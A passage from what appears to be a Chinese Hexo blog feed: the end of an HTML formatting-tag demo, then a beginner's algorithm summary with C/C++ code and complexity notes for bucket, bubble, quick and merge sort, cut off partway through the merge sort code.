punctuation">></span></span>Hello<span class="token entity" title="&nbsp;">&amp;nbsp;</span>HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">></span></span> HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sub</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">></span></span> HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sup</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>del</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看运行结果：</p><p><img src="/images/2.jpg" alt="Test"></p><p>怎么样，是不是很有趣，nice！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm——简单算法总结</title>
      <link href="/2020/03/05/algorithm/"/>
      <url>/2020/03/05/algorithm/</url>
      
        <content type="html"><![CDATA[<p>这篇博客很早就想整理了，一直没有时间，今天上课，课余时间真的不多，那就来整理一波；</p><a id="more"></a><h2 id="算法前言"><a href="#算法前言" class="headerlink" title="算法前言"></a>算法前言</h2><p>算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法</p><p>描述解决问题的策略机制；简单来讲，就是解决问题的方法和机制；</p><h3 id="算法特点"><a href="#算法特点" class="headerlink" title="算法特点"></a>算法特点</h3><p>1、有穷性：算法在执行有限的步骤之后，自动结束而不会出现无限循环，并且每一步骤在可接受的时间内完成；</p><p>2、确定性：算法的每一步骤都有确定的含义，不会出现二义性；</p><p>3、可行性：算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成;</p><p>4、输入输出：0至多个输入，1至多个输出；</p><h3 id="我所了解的算法"><a href="#我所了解的算法" class="headerlink" title="我所了解的算法"></a>我所了解的算法</h3><p>第一个接触的算法叫做排序，分了很多种（桶，冒泡，归并，快速）；二分法，前缀和与差分法，枚举法，bfs，</p><p>dfs，还有栈，队列等等；</p><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在接下来的一些时间里，快速学习多种算法，达到速成的效果；</p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><p>先说明一下，blog这东西很离谱，老是出现毛病，这篇博客全部用C++来写，但是代码标注是cpp，因为标注</p><p>C++的时候，到了网页上面就是部分代码残缺，2333</p><h3 id="Unix时间戳"><a href="#Unix时间戳" class="headerlink" title="Unix时间戳"></a>Unix时间戳</h3><p>讲算法之前，先说一个实用的东西——Unix时间戳；</p><p>Unix时间戳是从1970年1月1日开始所经过的秒数，不考虑闰秒。</p><p>这个是柠檬大佬给我写的（自己太菜）；</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;time.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    time_t now<span class="token punctuation">;</span>    <span class="token keyword">int</span> Time<span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"现在的时间为"</span> <span class="token operator">&lt;&lt;</span> Time <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Sort"><a href="#Sort" class="headerlink" title="Sort"></a>Sort</h3><h4 id="桶排序（Bucket-Sort）"><a href="#桶排序（Bucket-Sort）" class="headerlink" title="桶排序（Bucket Sort）"></a>桶排序（Bucket Sort）</h4><p>首先，我们来看桶排序。桶排序，顾名思义，会用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个</p><p>桶里的数据再单独进行排序。桶内排完序之后，再把每个桶里的数据按照顺序依次取出，组成的序列就是有序的</p><p>了；</p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> bucket<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>t<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>bucket<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>bucket<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//数组全体置为 0 </span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//输入一个数字 n，表示有 n个数 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//循环读入 n个数，并进行桶排序 </span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//把每次读入的数字用变量 t保存 </span>        bucket<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进行计数，对编号为 t的桶加一 </span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">101</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//依次判断编号为 0-100 的桶 </span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 出现几次就将桶打印几次 </span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设桶的个数为m，待排序数的个数为n；</p><p>第8行执行了m次，第13行执行了n次，第16行和第19行共执行了m+n次，所以程序共执行了2（m+n)次，时间复</p><p>杂度即为O（2*（m+n）），即O（m+n）；</p><h4 id="冒泡排序（Bubble-Sort）"><a href="#冒泡排序（Bubble-Sort）" class="headerlink" title="冒泡排序（Bubble Sort）"></a>冒泡排序（Bubble Sort）</h4><p>其次，我们来看冒泡排序。冒泡排序基本思想是：每次比较两个相邻的元素，如果它们的顺序错误就把它们交换过</p><p>来；</p><h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> t<span class="token punctuation">;</span>    t<span class="token operator">=</span><span class="token operator">*</span>a<span class="token punctuation">,</span><span class="token operator">*</span>a<span class="token operator">=</span><span class="token operator">*</span>b<span class="token punctuation">,</span><span class="token operator">*</span>b<span class="token operator">=</span>t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    <span class="token keyword">int</span> bubble<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输入一个n，表示有n个数。 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>bubble<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 循环读入n个数，放入数组中 </span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//下面是冒泡排序核心    </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//外层for循环控制循环次数 </span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token number">-1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//内层for循环控制相邻两元素进行比较 </span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>bubble<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>bubble<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//if(bubble[j]&lt;bubble[j+1]) </span>            <span class="token comment" spellcheck="true">// 比较；两数大小并交换，前者从小到大排序，后者从大到小排序（也可以通过输出改变排列次序） </span>            <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bubble<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>bubble<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//交换两个数 </span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>bubble<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设待排序数的个数为n；</p><p>不难看出，核心代码中，最短时间为n，最长为n^2,所以时间复杂度为O（n^2）；</p><h4 id="快速排序（Quick-Sort）"><a href="#快速排序（Quick-Sort）" class="headerlink" title="快速排序（Quick Sort）"></a>快速排序（Quick Sort）</h4><p>桶排序和冒泡排序虽然简单，但是如果有几万几亿个数排序，那效率就会非常低，这就需要一种快速的排序方法</p><p>——快速排序；</p><p>思路：</p><p>1.对于一个数组，首先选择一个基准值key，这个基准值可以随意选，但是一般选择的是这个数组的第一个元素；</p><p>2.我们对于这个数组，把数组中所有比基准值key小的元素向基准值key的左边扔，把数组中所有比基准值key大的</p><p>元素向key的右边扔；</p><p>3.这样的话基准值key就成为了一个”分界线”，所有比基准值key小的元素都在基准值key的左边，所有比基准值key</p><p>大的元素都在基准值key的右边；</p><p>4.之后我们在递归的对基准值key左边的序列和右边的序列再用以上方法进行排序；</p><p>5.最终整个序列就是有序的了；</p><h5 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> quick<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义全局变量，需要在子函数中使用 </span><span class="token keyword">void</span> <span class="token function">quicksort</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>t<span class="token punctuation">,</span>temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>left<span class="token operator">></span>right<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     temp<span class="token operator">=</span>quick<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// temp存的就是基准数 </span>    i<span class="token operator">=</span>left<span class="token punctuation">;</span>    j<span class="token operator">=</span>right<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">!=</span>j<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//顺序很重要 </span>    <span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>quick<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">>=</span>temp<span class="token operator">&amp;&amp;</span>i<span class="token operator">&lt;</span>j<span class="token punctuation">)</span> j<span class="token operator">--</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//从右往左找 </span>        <span class="token keyword">while</span><span class="token punctuation">(</span>quick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;=</span>temp<span class="token operator">&amp;&amp;</span>i<span class="token operator">&lt;</span>j<span class="token punctuation">)</span> i<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//从左往右找 </span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 交换两个数在数组中的位置 </span>        <span class="token punctuation">{</span>            t<span class="token operator">=</span>quick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            quick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>quick<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            quick<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>t<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 基准数归位 </span>    quick<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token operator">=</span>quick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    quick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span>    <span class="token function">quicksort</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span>i<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//继续处理左边的，这是一个递归的过程 </span>    <span class="token function">quicksort</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//继续处理右边的，这是一个递归的过程 </span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>quick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">quicksort</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 快排调用 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>quick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设需要排序的数字的个数为n；</p><p>理想的情况是，每次划分所选择的中间数恰好将当前序列几乎等分，经过log2n趟划分，便可得到长度为1的子</p><p>表。这样，整个算法的时间复杂度为O(nlog2n)；</p><p>最坏的情况是，每次所选的中间数是当前序列中的最大或最小元素，这使得每次划分所得的子表中一个为空表，另</p><p>一子表的长度为原表的长度-1。这样，长度为n的数据表的快速排序需要经过n趟划分，使得整个排序算法的时间</p><p>复杂度为O(n^2)；</p><p>平均起来，快速排序的时间复杂度为O（nlogn）；</p><h4 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h4><p>原理：</p><p>假设初始待排序数据有n个，可以将n个数据看成n个独立的子序列，因此每个子序列的长度为1，然后两两合并，</p><p>得到n/2个长度为2或1(如果n为奇数时，就会出现多出一个元素无法与其他元素合并)的有序子序列; 再两两合并，</p><p>一直重复下去，直到得到一个长度为n的有序序列为止（2路排序）；</p><p>核心：</p><p>两个有序子序列的合并；</p><p>（1）将待排序序列一分为二，对左右两边进行递归分割，得到m个子序列；</p><p>（2）对m个子序列递归执行合并操作，最终得到有序的序列；</p><h5 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token comment" spellcheck="true">//原数组arr1，临时空间数组arr2</span><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span> arr1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> arr2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> mid<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> low<span class="token punctuation">,</span> j <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">=</span> low<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>mid <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;=</span>high<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>arr1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            arr2<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr1<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            arr2<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr1<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>mid<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        arr2<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr1<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j<span class="token operator">&lt;=</span>high<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        arr2<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr1<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span>low<span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>high<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span><span class="token keyword">int</span> arr1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> arr2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//直到a=b时，停止递归。</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">&lt;</span>b<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token 